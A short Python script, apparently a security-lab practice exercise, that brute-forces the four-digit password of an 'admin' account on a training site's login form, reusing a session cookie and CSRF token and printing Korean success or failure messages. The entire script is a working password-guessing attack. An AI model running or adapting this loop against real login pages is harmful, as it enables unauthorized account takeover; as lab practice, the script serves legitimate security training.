import requests


주소 = "https://lab.eqst.co.kr:8110/practice/practice03/login"

헤더 = {    
    "Content-Type": "application/x-www-form-urlencoded"
}

쿠키 = {
    "JSESSIONID":"DF693ACF934BEA24E2962EC29E86D362"
}

데이터 = {
    "_csrf":"4e5c7c0b-8c65-43b5-9adc-2d86809c6ee2",
    "memberid":"admin",
    "password":"9999"
}

for i in range(0000,9999):
    pw = str(i).zfill(4)
    데이터['password']=pw 
    응답 = requests.post(주소, headers=헤더, cookies=쿠키, data=데이터)
    if '권한이 없습니다.' in 응답.text:
        print(f'[{pw}] 다시해')
        exit()
    if '로그인에 실패했습니다.' in 응답.text:
        print(f'[{pw}] 비번 틀렸어!')
    else:
        print(f"[{pw}] 성공!")
        break